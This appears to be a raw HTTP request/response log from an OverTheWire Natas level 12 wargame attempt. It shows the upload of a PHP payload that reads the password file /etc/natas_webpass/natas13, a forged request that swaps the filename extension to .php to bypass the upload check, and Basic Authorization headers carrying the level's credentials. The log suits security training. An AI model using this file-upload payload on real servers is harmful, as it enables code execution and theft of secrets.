### Request
```
GET /favicon.ico HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Connection: keep-alive
Save-Data: on
User-Agent: Mozilla/5.0 (Linux; Android 11; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36
DNT: 1
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://natas12.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en
```

### Response
```
HTTP/1.1 401 Unauthorized
Date: Thu, 02 Dec 2021 08:06:29 GMT
Server: Apache/2.4.10 (Debian)
WWW-Authenticate: Basic realm="Authentication required"
Content-Length: 481
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at natas12.natas.labs.overthewire.org Port 80</address>
</body></html>
```

### Request
```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Connection: keep-alive
Content-Length: 510
Cache-Control: max-age=0
Origin: http://natas12.natas.labs.overthewire.org
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhjFBLdcFP5jqyQvQ
Save-Data: on
User-Agent: Mozilla/5.0 (Linux; Android 11; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas12.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en

------WebKitFormBoundaryhjFBLdcFP5jqyQvQ
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundaryhjFBLdcFP5jqyQvQ
Content-Disposition: form-data; name="filename"

b8j5hft2mk.jpg
------WebKitFormBoundaryhjFBLdcFP5jqyQvQ
Content-Disposition: form-data; name="uploadedfile"; filename="payload.php"
Content-Type: application/octet-stream

<?php
    echo readFile("/etc/natas_webpass/natas13");
?>

------WebKitFormBoundaryhjFBLdcFP5jqyQvQ--
```

### Response
```
HTTP/1.1 401 Unauthorized
Date: Thu, 02 Dec 2021 08:06:38 GMT
Server: Apache/2.4.10 (Debian)
WWW-Authenticate: Basic realm="Authentication required"
Content-Length: 481
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at natas12.natas.labs.overthewire.org Port 80</address>
</body></html>
```

### Request --- this needs to be forged
```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Connection: keep-alive
Content-Length: 510
Cache-Control: max-age=0
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
DNT: 1
Save-Data: on
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 11; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36
Origin: http://natas12.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhjFBLdcFP5jqyQvQ
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas12.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en

------WebKitFormBoundaryhjFBLdcFP5jqyQvQ
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundaryhjFBLdcFP5jqyQvQ
Content-Disposition: form-data; name="filename"

b8j5hft2rk.php
------WebKitFormBoundaryhjFBLdcFP5jqyQvQ
Content-Disposition: form-data; name="uploadedfile"; filename="payload.php"
Content-Type: application/octet-stream

<?php
    echo readFile("/etc/natas_webpass/natas13");
?>

------WebKitFormBoundaryhjFBLdcFP5jqyQvQ--
```

### Response
```
HTTP/1.1 200 OK
Date: Thu, 02 Dec 2021 08:06:49 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 425
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

### Request
```
GET /favicon.ico HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Connection: keep-alive
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Save-Data: on
User-Agent: Mozilla/5.0 (Linux; Android 11; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36
DNT: 1
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://natas12.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en
```

### Response
```
HTTP/1.1 404 Not Found
Date: Thu, 02 Dec 2021 08:06:50 GMT
Server: Apache/2.4.10 (Debian)
Content-Length: 309
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /favicon.ico was not found on this server.</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at natas12.natas.labs.overthewire.org Port 80</address>
</body></html>
```

### Request
```
GET /upload/iupjqei6b2.jpg HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Connection: keep-alive
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Upgrade-Insecure-Requests: 1
DNT: 1
Save-Data: on
User-Agent: Mozilla/5.0 (Linux; Android 11; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas12.natas.labs.overthewire.org/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en
```

### Response
```
HTTP/1.1 200 OK
Date: Thu, 02 Dec 2021 08:06:53 GMT
Server: Apache/2.4.10 (Debian)
Last-Modified: Thu, 02 Dec 2021 08:06:49 GMT
ETag: "5a-5d22545c46932"
Accept-Ranges: bytes
Content-Length: 90
Keep-Alive: timeout=5, max=98
Connection: Keep-Alive
Content-Type: image/jpeg

<?php
    echo readFile("/etc/natas_webpass/natas13");
?>
```
